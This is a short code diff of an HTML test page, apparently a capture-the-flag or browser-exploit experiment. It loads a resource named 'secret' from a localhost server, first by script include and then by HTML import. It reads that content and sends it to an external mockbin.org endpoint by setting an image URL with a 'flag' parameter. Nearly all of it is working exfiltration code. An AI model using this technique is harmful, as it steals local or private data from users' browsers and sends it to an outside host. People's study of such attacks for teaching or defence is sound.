@@ -3,11 +3,10 @@
   <head>
     <meta charset="utf-8">
     <title>test</title>
-    
+    <link rel="import" href="http://127.0.0.1:8080/secret">
   </head>
   <body>
   
- <script src="http://127.0.0.1:8080/secret.html"></script> 
     <script>
 	
 function getBase64Image(img) {
@@ -32,9 +31,9 @@ function sendrequ(payload){
 	img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + payload;
 	document.body.appendChild(img);
 }   
-console.log(document.scripts.length);
-console.log(document.scripts[0].text);
-sendrequ(document.scripts[0].text);
+
+console.log(document.querySelector('link[rel="import"]').import);
+sendrequ(document.querySelector('link[rel="import"]').import);
 /*
 function getFrameContents(){
    var iFrame =  document.getElementById('testf');
